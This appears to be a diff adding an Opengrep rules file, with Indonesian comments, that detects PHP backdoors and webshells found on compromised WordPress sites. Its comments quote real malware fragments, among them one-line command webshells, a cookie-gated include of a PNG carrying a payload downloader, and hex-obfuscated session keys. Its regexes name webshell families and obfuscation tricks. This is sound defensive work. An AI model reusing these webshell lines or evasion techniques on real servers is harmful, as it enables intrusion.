@@ -1,0 +1,535 @@
+# Backdoor dan webshell PHP yang disisipkan penyerang.
+#
+# Diukur di KODIM1016 (WordPress yang sudah dibobol): eval($o($p)) dengan
+# payload base64 di header.php dan wp-includes/revisions.php,
+# eval("\x3f\x3e" . ...) dengan ratusan goto di content.php/about.php,
+# eval(base64_decode('...')) di wp-admin/network/wp/*.php. Bentuk-bentuk ini
+# praktis tidak pernah muncul di kode sah.
+#
+# Aturan regex — kode backdoor sengaja dibuat sulit diurai parser PHP.
+# Backslash literal ditulis sebagai kode heksadesimal 5c: Opengrep menafsirkan
+# ulang backslash ganda.
+rules:
+  - id: php-backdoor-eval-decoded-payload
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      eval() menjalankan kode hasil dekode (base64_decode, gzinflate,
+      str_rot13, dan sejenisnya). Pola ini adalah ciri khas backdoor/webshell:
+      kode yang sebenarnya disembunyikan dari pembaca dan pemindai. Anggap
+      server sudah disusupi: isolasi, periksa log akses ke berkas ini, cari
+      berkas serupa, ganti seluruh kredensial, lalu pulihkan dari sumber yang
+      bersih.
+    pattern-regex: \beval(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\((?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*(["'](\x5cx3[fF]\x5cx3[eE]|\?>)["'](?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\.(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*)?@?(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*(base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|strrev|hex2bin|convert_uudecode|rawurldecode)(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\(
+    metadata:
+      judul: "Backdoor PHP menjalankan kode terenkode lewat eval"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://cwe.mitre.org/data/definitions/506.html
+
+  - id: php-backdoor-eval-variable-function
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      eval() menjalankan hasil pemanggilan fungsi yang namanya disimpan di
+      variabel ($o($p)) atau kode yang diawali tag penutup PHP ("?>"). Kedua
+      bentuk ini dipakai backdoor untuk menyamarkan base64_decode dan
+      sejenisnya dari pemindai. Anggap server sudah disusupi dan tangani
+      sebagai insiden.
+    # "?>" biasa yang disambung ke variabel sah: Twig memuat template
+    # terkompilasi dengan eval('?>' . $content). Yang dilaporkan hanya bentuk
+    # heksadesimal "\x3f\x3e" (penyamaran) atau disambung ke fungsi-variabel.
+    # eval(${"…"}) — variabel-variabel bernama string biner — dipakai pengacak
+    # "Encryptor by Obelix666" (doharalutsistaarhanud, tiga salinan di tema
+    # Divi yang tidak disebut laporan Sonnet).
+    pattern-regex: \beval(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\((?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*((["'](\x5cx3[fF]\x5cx3[eE]|\?>)["']|\$\w+)(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\.(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*)?\$\w+(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\(|\beval(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\((?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*["']\x5cx3[fF]\x5cx3[eE]["'](?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\.|\beval(?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\((?:\s|/\*[^*]*\*+(?:[^/*][^*]*\*+)*/)*\$\{
+    metadata:
+      judul: "Backdoor PHP eval dengan fungsi dari variabel"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://cwe.mitre.org/data/definitions/506.html
+
+  - id: php-backdoor-goto-obfuscation
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc"]
+    severity: ERROR
+    message: >-
+      Berkas memakai puluhan pernyataan goto untuk mengacak alur kode dan
+      memanggil eval(). Pola ini dihasilkan alat pengacak kode yang dipakai
+      pembuat backdoor; kode aplikasi dan pustaka yang sah tidak ditulis
+      seperti ini. Tangani sebagai insiden penyusupan.
+    # Laporan jatuh pada eval pertama di berkas yang memuat ≥ 20 goto.
+    pattern-regex: (?s)\A(?=(?:.*?\bgoto\s+\w+\s*;){20}).*?\K\beval\s*\(
+    metadata:
+      judul: "Backdoor PHP disamarkan dengan goto"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://cwe.mitre.org/data/definitions/506.html
+
+  - id: php-webshell-signature
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Berkas memuat penanda webshell yang dikenal (FilesMan/WSO, b374k, c99,
+      r57, IndoXploit, reverse shell). Webshell memberi penyerang kendali
+      penuh atas server lewat browser. Tangani sebagai insiden: isolasi
+      server, simpan salinan berkas untuk forensik, hapus, dan telusuri cara
+      berkas ini diunggah.
+    pattern-regex: (?i)(\$default_action\s*=\s*['"]FilesMan['"]|\bb374k\b|\bc99shell\b|\br57shell\b|\bIndoXploit\b|\bWSO\s+[0-9]\.[0-9]|ULTRA\s+STEALTH\s+REVERSE\s+SHELL|\bfsockopen\s*\([^;]*\)\s*;[^;]*\b(proc_open|shell_exec|passthru)\s*\(|Encrypt(or|ed)[ \t]+by[ \t:]*Obelix666)
+    metadata:
+      judul: "Tanda tangan webshell PHP yang dikenal"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://cwe.mitre.org/data/definitions/506.html
+
+  # Ditemukan di KODIM1016 saat memverifikasi temuan lain:
+  # wp-content/languages/0ft8h8o9.php ("BDKR28 is here") — gerbang sandi
+  # `?BDKR28=llbl` lalu move_uploaded_file ke nama berkas dari klien. Tidak
+  # memakai eval/base64/goto, sehingga seluruh aturan backdoor yang ada
+  # melewatkannya; yang melaporkannya hanya aturan unggahan (MEDIUM).
+  - id: php-backdoor-password-gated-dangerous-script
+    languages: [php]
+    severity: ERROR
+    message: >-
+      Berkas ini dijaga kata sandi yang tertulis di kodenya sendiri, lalu
+      menjalankan perintah, menulis berkas, atau menerima unggahan. Itu
+      bentuk webshell: aplikasi yang sehat memakai sesi login aplikasinya,
+      bukan satu kata sandi tetap di dalam berkas. Tangani sebagai insiden —
+      isolasi server, simpan salinannya untuk forensik, hapus berkasnya, lalu
+      telusuri cara berkas ini sampai ke server.
+    patterns:
+      - pattern-either:
+          - pattern: move_uploaded_file(...)
+          - pattern: eval(...)
+          - pattern: system(...)
+          - pattern: shell_exec(...)
+          - pattern: passthru(...)
+          - pattern: proc_open(...)
+          - pattern: popen(...)
+          - pattern: file_put_contents(...)
+      # Nilai dari permintaan dibandingkan dengan literal, lalu berhenti bila
+      # tidak cocok: gerbang autentikasi berkata sandi tetap.
+      - pattern-either:
+          - pattern-inside: |
+              $P = <... $_GET[...] ...>;
+              ...
+              if ($P !== "$LIT") { ... exit; }
+              ...
+          - pattern-inside: |
+              $P = <... $_POST[...] ...>;
+              ...
+              if ($P !== "$LIT") { ... exit; }
+              ...
+          - pattern-inside: |
+              $P = <... $_REQUEST[...] ...>;
+              ...
+              if ($P !== "$LIT") { ... exit; }
+              ...
+          - pattern-inside: |
+              $P = <... $_COOKIE[...] ...>;
+              ...
+              if ($P !== "$LIT") { ... exit; }
+              ...
+      # Variabel gerbangnya dinamai sandi/kunci/token — `if ($action !==
+      # 'save') { exit; }` pada aplikasi biasa tidak ikut.
+      - metavariable-regex:
+          metavariable: $P
+          regex: (?i)^\$\w*(pass|pwd|sandi|kunci|key|token|auth|secret)\w*$
+    metadata:
+      judul: "Skrip berbahaya berpelindung kata sandi (backdoor PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://cwe.mitre.org/data/definitions/506.html
+
+
+  # KODIM1016 `wp-content/languages/chat_ai.php`: file manager lengkap tanpa
+  # autentikasi apa pun — unggah ke direktori pilihan, hapus rekursif,
+  # rename, dan sunting berkas. Yang menentukan bukan jumlah fiturnya,
+  # melainkan satu baris ini: tujuan DAN isi tulisan sama-sama dari
+  # permintaan. `is_safe_path()` di sana hanya memanggil realpath(), jadi
+  # tidak membatasi apa pun.
+  - id: php-arbitrary-file-write-from-request
+    languages: [php]
+    severity: ERROR
+    message: >-
+      Berkas ditulis dengan tujuan dan isi yang sama-sama berasal dari
+      permintaan. Siapa pun yang dapat memanggil halaman ini dapat menulis
+      berkas PHP baru di server dan menjalankannya — setara memberi akses
+      penuh. Bila halaman ini tidak Anda tulis sendiri, perlakukan sebagai
+      webshell: isolasi server, simpan salinannya untuk forensik, hapus, lalu
+      telusuri cara berkas ini sampai ke server. Bila ini memang fitur
+      aplikasi, tujuannya harus dikunci ke satu folder (path tetap + nama
+      yang dibuat server) dan aksinya diberi pemeriksaan hak akses.
+    patterns:
+      - pattern: file_put_contents($P, $C, ...)
+      - metavariable-pattern:
+          metavariable: $C
+          patterns:
+            - pattern-either:
+                - pattern: $_POST[...]
+                - pattern: $_GET[...]
+                - pattern: $_REQUEST[...]
+      - pattern-either:
+          - pattern-inside: |
+              $P = <... $_GET[...] ...>;
+              ...
+          - pattern-inside: |
+              $P = <... $_POST[...] ...>;
+              ...
+          - pattern-inside: |
+              $P = <... $_REQUEST[...] ...>;
+              ...
+    metadata:
+      judul: "Penulisan berkas bebas dari permintaan (PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-434: Unrestricted Upload of File with Dangerous Type"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://cwe.mitre.org/data/definitions/434.html
+
+  # doharalutsistaarhanud tema Divi …/fonts/ajax-handler.php (varian "xd",
+  # tiga salinan): kepala CodeIgniter palsu, lalu nama fungsi disimpan sebagai
+  # heksadesimal — "6F70656E73736C5F64656372797074" = openssl_decrypt,
+  # "677A696E666C617465" = gzinflate — dan dipanggil lewat variabel. Tidak ada
+  # eval() sama sekali, sehingga aturan backdoor lain melewatkannya. Kode sah
+  # tidak pernah menyimpan nama fungsi bawaan PHP sebagai heksadesimal.
+  - id: php-backdoor-hex-encoded-function-name
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Nama fungsi PHP berbahaya (eval, base64_decode, gzinflate,
+      openssl_decrypt, shell_exec, system, dan sejenisnya) ditulis sebagai
+      string heksadesimal supaya tidak terbaca pemindai, lalu didekode dan
+      dipanggil lewat variabel. Kode sah tidak pernah menyamarkan nama fungsi
+      bawaan seperti ini — ini ciri backdoor terenkripsi. Tangani sebagai
+      insiden: isolasi server, simpan salinan berkas, hapus, dan ganti berkas
+      tema/plugin yang disisipi dengan salinan bersih dari sumber resminya.
+    pattern-regex: (?i)["'](6576616c|617373657274|6261736536345f6465636f6465|677a696e666c617465|677a756e636f6d7072657373|677a6465636f6465|7374725f726f743133|6f70656e73736c5f64656372797074|7368656c6c5f65786563|73797374656d|7061737374687275|70726f635f6f70656e|706f70656e|6372656174655f66756e6374696f6e|6d6f76655f75706c6f616465645f66696c65|73747265616d5f777261707065725f7265676973746572)["']
+    metadata:
+      judul: "Nama fungsi berbahaya disamarkan heksadesimal (backdoor PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1027/
+        - https://cwe.mitre.org/data/definitions/506.html
+
+  # Kode hasil dekode dijalankan lewat include, bukan eval — tiga bentuk:
+  # * include socket_get_status($tmp)['uri'] — varian "ChaCha"
+  #   doharalutsistaarhanud (…/codesample/css/core.php, tiga salinan):
+  #   membaca muatan setelah __halt_compiler di berkasnya sendiri, gzinflate,
+  #   geser Caesar, tulis ke tmpfile(), lalu include path berkas sementara itu;
+  # * include "data:…" — kode di dalam URI data;
+  # * include "skema://" dari stream wrapper yang didaftarkan berkas itu
+  #   sendiri — varian "xd" (stream_wrapper_register("inc", …)).
+  - id: php-backdoor-include-decoded-code
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Berkas ini menjalankan kode yang baru didekode saat berjalan lewat
+      include/require — dari berkas sementara, dari URI data:, atau dari
+      stream wrapper buatannya sendiri. Teknik ini dipakai backdoor untuk
+      menghindari eval() yang mudah dikenali pemindai; muatan sebenarnya
+      tersandi di dalam berkas. Tangani sebagai insiden: isolasi server,
+      simpan salinan berkas, hapus, dan ganti berkas tema/plugin yang disisipi
+      dengan salinan bersih.
+    pattern-regex: (?s)\b(include|require)(_once)?\b\s*\(?\s*(socket_get_status|stream_get_meta_data)\s*\(|\b(include|require)(_once)?\b\s*\(?\s*["']data:|\A(?=.*?\bstream_wrapper_register\s*\().*?\K\b(include|require)(_once)?\b\s*\(?\s*["'][a-z][a-z0-9+.-]*://["']\s*\.
+    metadata:
+      judul: "Backdoor PHP meng-include kode hasil dekode"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1027/
+        - https://attack.mitre.org/techniques/T1140/
+
+  # doharalutsistaarhanud .well-known/db.php: "PRIVDAYZ GLOBAL DB CONFIG
+  # HUNTER" — menelusuri seluruh folder mencari berkas konfigurasi 20+ CMS
+  # lalu mengambil DB_NAME/DB_USER/DB_PASSWORD dengan regex. Penanda nama
+  # alat tidak dipakai: yang dinilai perilakunya, supaya salinan yang namanya
+  # dihapus tetap tertangkap.
+  - id: php-credential-harvester-cms-config
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Berkas ini menelusuri folder server mencari berkas konfigurasi berbagai
+      CMS (wp-config.php, configuration.php Joomla, env.php Magento, dan
+      lainnya) lalu mengambil kata sandi basis datanya — alat pencuri
+      kredensial yang ditanam penyerang. Anggap semua kredensial basis data
+      yang terjangkau dari server ini sudah bocor: ganti kata sandinya, hapus
+      berkas ini setelah salinannya disimpan sebagai bukti, dan periksa akses
+      ke basis data sejak berkas ini muncul.
+    pattern-regex: (?s)\A(?=.*?wp-config\.php)(?=.*?configuration\.php)(?=.*?(app/etc/env\.php|sites/default/settings\.php|LocalConfiguration\.php|application/config/database\.php))(?=.*?DB_PASSWORD).*?\K\b(RecursiveDirectoryIterator|glob\s*\(|scandir\s*\()
+    metadata:
+      judul: "Pencuri kredensial konfigurasi CMS (PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1552/001/
+        - https://cwe.mitre.org/data/definitions/506.html
+
+  # korem 012 .data/ dan .log/: 46 berkas satu baris — `<?php
+  # if($_GET["c"]){system($_GET["c"]." 2>&1");} ?>`, `$a=$_POST["cmd"];
+  # passthru($a);` — sebelumnya hanya dilaporkan sebagai command injection
+  # (CWE-78), sehingga tidak masuk daftar IOC/eradikasi. Berkas PHP yang
+  # seluruh isinya hanya menjalankan perintah dari permintaan adalah
+  # webshell, bukan kode aplikasi yang rentan.
+  # Sumbernya juga header HTTP (`system($_SERVER["HTTP_CMD"])`) dan berkas
+  # unggahan; sink-nya juga backtick dan move_uploaded_file. Berkas yang
+  # sudah dinetralkan pemindai hosting (`tmp.php.quarantine`) tetap
+  # dilaporkan: jejaknya dipakai untuk eradikasi dan menelusuri jalan masuk.
+  - id: php-webshell-minimal-command-from-request
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7", "*.quarantine", "*.suspected"]
+    severity: ERROR
+    message: >-
+      Seluruh isi berkas ini (kurang dari 400 karakter) hanya menjalankan
+      perintah sistem, kode, atau unggahan yang dikirim lewat permintaan —
+      webshell minimal, bukan kode aplikasi. Siapa pun yang mengetahui
+      alamatnya dapat menjalankan perintah di server. Tangani sebagai
+      insiden: simpan salinannya, hapus, cari berkas serupa di folder yang
+      sama (biasanya ditanam puluhan sekaligus dengan nama acak atau nama
+      folder sistem), lalu telusuri cara berkas ini sampai ke server. Berkas
+      berakhiran .quarantine/.suspected sudah dinetralkan pemindai hosting,
+      tetapi tetap bukti bahwa webshell pernah ada.
+    pattern-regex: (?s)\A\s*<\?php\b(?=.{0,400}\z)(?=.*?(\$_(GET|POST|REQUEST|COOKIE|FILES)\b|\$_SERVER\s*\[\s*["']HTTP_)).*?\K(\b(system|shell_exec|passthru|exec|popen|proc_open|assert|eval|move_uploaded_file)\s*\(|`)
+    metadata:
+      judul: "Webshell PHP minimal menjalankan perintah dari permintaan"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1505/003/
+
+  # KODIM1016 — dua keluarga yang lolos seluruh aturan lain dan baru
+  # terungkap lewat .htaccess locker (lihat htaccess-php-lockdown-allowlist):
+  # TInmGi.php/UjenHwy.php/ruBrJuB.php/FuNEjj.php (60 KB) dan
+  # pQLghs.php/cjkXwce.php (669 KB, diacak goto): muatan base64 ditulis ke
+  # berkas sementara, di-include, lalu berkasnya dihapus. Tidak ada eval().
+  - id: php-backdoor-write-decoded-then-include
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Kode hasil dekode (base64_decode, gzinflate, dan sejenisnya) ditulis ke
+      sebuah berkas lalu berkas itu dijalankan dengan include/require. Ini
+      cara backdoor menjalankan muatan tersembunyi tanpa eval(); berkas
+      sementaranya biasanya langsung dihapus sesudahnya. Tangani sebagai
+      insiden: isolasi server, simpan salinan berkas, hapus, lalu cari
+      salinan lain berukuran sama di folder web.
+    pattern-regex: (?s)\bfile_put_contents\s*\(\s*(\$\w+)\s*,\s*@?\s*(base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|hex2bin|convert_uudecode)\s*\(.*?\b(include|require)(_once)?\b\s*\(?\s*\1\b
+    metadata:
+      judul: "Backdoor PHP menulis kode terdekode lalu meng-include"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1027/
+        - https://attack.mitre.org/techniques/T1140/
+
+  # KODIM1016 wp-content/themes/twentytwenty/inc/wp-blog-header.php dan dua
+  # wp-login.php palsu (3.704 byte, identik): nama fungsi dan path dipecah
+  # menjadi potongan satu-dua huruf ("fi"."le"."_"."e"."x"."i"."s"."ts"),
+  # lalu dipanggil lewat call_user_func untuk menulis ulang .htaccess dan
+  # index.php penyerang dari salinan yang disamarkan sebagai .css/.png.
+  - id: php-backdoor-split-string-obfuscation
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Nama fungsi atau path dirakit dari potongan string satu-dua huruf
+      ("fi"."le"."_"."e"…) supaya tidak terbaca pemindai. Kode sah tidak
+      pernah ditulis seperti ini; pada kasus nyata bentuk ini dipakai
+      pemulih persistensi yang menulis ulang .htaccess dan index.php
+      penyerang setiap kali dibersihkan. Tangani sebagai insiden, dan cari
+      salinan cadangan yang dirujuk berkas ini (sering bernama mirip berkas
+      bawaan WordPress, berekstensi .css/.js/.png/.gif).
+    pattern-regex: (?:["'][\w./-]{1,3}["']\s*\.\s*){7,}["'][\w./-]{1,3}["']
+    metadata:
+      judul: "Nama fungsi dirakit dari potongan string (backdoor PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1027/
+
+  # kodam13tniadmil (laporan Sonnet: "0 webshell"): redirect-page.php milik
+  # plugin capability-manager-enhanced disisipi satu baris di awalnya —
+  # `if(isset($_COOKIE["imgme"])){$incName=".../images/fb9.png";
+  # include($incName);exit;}`. fb9.png adalah PNG sah yang chunk tEXt-nya
+  # memuat PHP pengunduh muatan dari egre55.com. SVG sengaja tidak termasuk:
+  # tema sah meng-include SVG untuk menyisipkan ikon. .txt/.css juga tidak:
+  # aplikasi PHP lama meng-include potongan menu berekstensi .txt
+  # (disbintaladtniad admin1/lefnav.php `include("menupenulis.txt")`).
+  - id: php-backdoor-include-image-file
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Berkas gambar (atau aset statis lain) dijalankan sebagai kode PHP lewat
+      include/require. Gambar sah tidak pernah di-include; yang dijalankan
+      adalah kode PHP yang disembunyikan di dalam data gambar (mis. chunk
+      tEXt PNG), dan baris ini adalah pemicunya — sering dijaga cookie atau
+      parameter rahasia. Tangani sebagai insiden: simpan salinan berkas ini
+      dan gambar yang dirujuknya, hapus keduanya, dan pulihkan berkas
+      plugin/tema dari sumber resmi.
+    pattern-regex: (?s)(\$\w+)\s*=\s*["'][^"'\n]+\.(png|jpe?g|gif|ico|bmp|webp)["']\s*;.{0,300}?\b(include|require)(_once)?\b\s*\(?\s*\1\b|\b(include|require)(_once)?\b\s*\(?\s*["'][^"'\n]+\.(png|jpe?g|gif|ico|bmp|webp)["']
+    metadata:
+      judul: "Berkas gambar dijalankan sebagai kode PHP"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1027/003/
+        - https://attack.mitre.org/techniques/T1505/003/
+
+  # kodam13tniadmil …/top-notice/decryptor.php dan envload.php (84 byte,
+  # identik): `$_SESSION["\x58\x2d\x48\x30\x55\x52"] = true; echo "ok";` —
+  # kunci sesi "X-H0UR" yang membuka webshell bergerbang sesi. Nama kunci
+  # sesi yang disamarkan heksadesimal tidak dipakai kode sah.
+  - id: php-backdoor-hex-escaped-session-key
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Nilai sesi ditulis dengan nama kunci yang disamarkan sebagai escape
+      heksadesimal ("\x58\x2d…"). Aplikasi sah menulis nama kunci sesi apa
+      adanya; bentuk ini dipakai berkas pembuka yang menandai sesi penyerang
+      supaya webshell bergerbang sesi di tempat lain mau dijalankan. Tangani
+      sebagai insiden dan cari berkas lain yang membaca kunci sesi yang sama.
+    pattern-regex: \$_SESSION\s*\[\s*["'](\x5cx[0-9a-fA-F]{2}){3,}["']\s*\]\s*=
+    metadata:
+      judul: "Kunci sesi disamarkan escape heksadesimal (backdoor PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: MEDIUM
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1505/003/
+
+  # kodam13tniadmil …/top-notice/network_1.php: menyimpan $_GET["data"] ke
+  # sesi, lalu mengganti nama dirinya menjadi po_<id sesi>__<path sesi>.php
+  # — peracunan berkas sesi yang kemudian di-include sebagai PHP.
+  - id: php-backdoor-session-poisoning-self-rename
+    languages: [regex]
+    paths:
+      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7"]
+    severity: ERROR
+    message: >-
+      Berkas ini menyimpan nilai dari permintaan ke dalam sesi lalu mengganti
+      nama dirinya sendiri. Itu teknik peracunan berkas sesi: data penyerang
+      ditulis ke berkas sesi di disk, lalu berkas itu di-include sebagai PHP
+      untuk menjalankan perintah. Kode sah tidak mengganti nama berkasnya
+      sendiri. Tangani sebagai insiden: hapus berkas ini, bersihkan folder
+      sesi PHP, dan cari berkas bernama po_*.php.
+    pattern-regex: (?s)\A(?=.*?\$_SESSION\s*\[[^\]]+\]\s*=\s*\$_(GET|POST|REQUEST|COOKIE)\b).*?\K\brename\s*\(\s*__FILE__\b
+    metadata:
+      judul: "Peracunan sesi lalu berkas mengganti nama sendiri (backdoor PHP)"
+      category: security
+      subcategory: [vuln]
+      cwe: "CWE-506: Embedded Malicious Code"
+      owasp: "A08:2021 - Software and Data Integrity Failures"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      technology: [php, wordpress]
+      references:
+        - https://attack.mitre.org/techniques/T1505/003/
